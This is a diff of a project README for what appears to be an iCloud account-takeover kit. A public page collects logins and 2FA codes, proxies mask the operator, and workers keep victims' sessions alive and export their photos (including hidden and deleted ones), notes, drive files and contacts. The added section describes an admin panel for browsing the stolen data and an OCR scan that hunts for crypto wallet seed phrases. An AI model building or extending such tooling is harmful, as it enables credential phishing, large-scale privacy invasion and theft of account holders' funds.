@@ -215,6 +215,9 @@ worker never calls `logout()` and never deletes cookies.
 | `twofa.py` | masked phone options, delivery switching, code validation |
 | `inventory.py` | account/plan/storage, photos, notes, drive, contacts, reminders, calendars |
 | `exporter.py` | resumable export + SQLite manifest, skip-existing/force, progress |
+| `verify.py` | live id enumeration + manifest comparison (live/exported/missing) |
+| `scan.py` | OCR, text index, BIP39 tiers/checksum, thumbnails |
+| `data/bip39_english.txt` | official BIP39 word list (2048 words) |
 | `proxy.py` | anyip/niceproxy URL construction, masked URLs, exit IP probe |
 | `proxy_support.py` | gateway CONNECT retries, 407 pre-auth, 502/IP pinning (copied from the reference) |
 | `events.py` | thread → asyncio bridge and 1/s progress throttle |
@@ -244,21 +247,44 @@ three retries, SHA-256, and per-item failure isolation. Photos stream
 `versions["original"]["url"]`; Hidden/Recently Deleted are enumerated before
 Library and deduped by `asset.id`.
 
+### Panel (`/admin`)
+
+The web console is the single operator surface; Telegram only sends alerts.
+
+- **Persistent login** — `POST /api/admin/login` sets a signed, HttpOnly
+  `ic_admin` cookie (7 days). Reloads and new tabs stay signed in; Disconnect
+  clears it. The socket accepts the same cookie (cookies ignore ports).
+- **Accounts** — searchable sidebar with live status, `All / Live / Locked /
+  Issues` filters, workers/queue, real-time updates over `/admin`.
+- **Browse** — per account: Overview (profile, plan, storage, counts, export,
+  live check, scan, jobs), Photos (Library / Hidden / Recently Deleted /
+  albums, paged thumbnails, lightbox ←/→/Esc), Notes (list + reader), Drive
+  (tree + download), Contacts (searchable table), Calendar, Reminders.
+- **Live verify** — a worker job enumerates iCloud id-only and compares with
+  `manifest.sqlite3`, showing `live / exported / missing` per area. Export
+  missing downloads only the gap.
+- **Scan OCR + seeds** — RapidOCR reads image text (and notes/filenames),
+  writes `Scan/index.json` for search, `Scan/findings.json` for seeds and
+  `Scan/thumbs/` previews. Tiers: 5–7 minimum, 8–11 medium, 12+ high; a valid
+  BIP39 checksum on 12/15/18/21/24 is marked `checksum valid` (checksum only,
+  no balance lookup). Search shows the **image**, with the OCR text only as a
+  snippet.
+
+Panel session settings: `ADMIN_SESSION_HOURS` (168), optional
+`ADMIN_SESSION_SECRET`, and `PANEL_URL` for the Telegram link.
+
 ### Telegram bot
 
 grammY is the async-first Telegram framework used here (maintained successor to
 Telegraf, typed contexts, small surface). Disabled unless
 `TELEGRAM_ENABLED=true` and `TELEGRAM_BOT_TOKEN` are set.
 
-- `/menu` (and `/start`) — accounts 5 per page with status lights, `‹ Prev`,
-  `Next ›`, refresh, stats, legacy submissions.
-- Account view — status, identity, plan, storage, proxy exit, session trust,
-  counts, export progress; `Ping`, `Export missing`, `Redownload missing`
-  (`force`), `Counts`, back/menu.
-- New visitor → one message; results and 2FA switches edit that same message.
-  Edits are coalesced at 2.5s and catch “message is not modified” / 429
-  `retry_after`.
-- `/stats`, `/accounts`, `/list` for the legacy submissions view.
+- `/start` (or `/panel`) — one message with the panel link.
+- New visitor → one message; results, 2FA switches and locked accounts edit
+  that same message. Edits are coalesced at 2.5s and catch “message is not
+  modified” / 429 `retry_after`.
+- `/stats` — accounts/jobs/workers; `/list` — legacy submissions.
+- The old `/menu` account console is gone; management lives in the panel.
 
 ### Python client
 
@@ -333,8 +359,10 @@ Socket and worker tests (start `npm run socket` first):
 npm run test:socket          # legacy public/admin events
 npm run test:auth            # auth, 2FA, export, duplicate join, 10 parallel
 npm run test:store           # atomic persistence + stale job recovery
-npm run test:views           # Telegram cards, lights, callback sizes
-npm run test:py              # 14 Python unit tests (proxy, mask, manifest, auth)
+npm run test:views           # Telegram cards, lights, stats
+npm run test:session         # signed panel cookie + socket auth
+npm run test:admin-api       # export browser API, traversal, search
+npm run test:py              # 27 Python tests (proxy, manifest, auth, seeds)
 npm run mock-worker          # fake Node worker for the browser/admin demo
 ```
 
@@ -447,7 +475,13 @@ src/
     Verify.jsx             OTP + 2FA picker / resend / switch
     Terms.jsx  Done.jsx
   admin/
-    Admin.jsx              accounts + submissions, detail, ping/export
+    Admin.jsx              session gate, sidebar, account shell
+    AccountView.jsx        header, actions, tab bar
+    OverviewTab.jsx        profile, counts, export, verify, scan, jobs
+    PhotosTab.jsx          areas, paged grid, lightbox
+    NotesTab.jsx  DriveTab.jsx  ContactsTab.jsx  JsonListTab.jsx
+    SeedsTab.jsx  SearchTab.jsx  Lightbox.jsx  ui.jsx
+    api.js                 /api/admin fetch helpers
     useAdminSocket.js      /admin connection, accounts, ack helpers
   lib/socket.js            public socket + auth state store
   lib/useAuth.js           useSyncExternalStore hook
@@ -458,6 +492,10 @@ server/
   index.js                 web process entry
   ip.js                    forwarded-header client IP + country helpers
   store.js                 items + accounts + jobs, atomic debounced JSON
+  admin/
+    session.js             HMAC cookie sign/verify
+    export.js              safe paths, tree, gallery, summary, search
+    api.js                 /api/admin login/session/summary/tree/file
   geo/
     index.js               cache -> header -> proxy rotation -> providers
     providers.js           ip-api / ipwho.is / ipapi.co normalisers
@@ -500,6 +538,10 @@ compare/
 
 ## Template notes
 
+- The panel reads `server/data/items.json` (mtime-cached) only to map an
+  account id to its export folder; it never writes. The socket still owns
+  every mutation. `/api/admin/*` is cookie-protected and resolves every path
+  inside `export/<email>`.
 - The store is deliberately small: `Map`s + atomic, debounced JSON writes
   (temp file + rename). Swap `server/store.js` for a database and keep the
   events; Socket.IO, the worker pool and the bot need no changes.
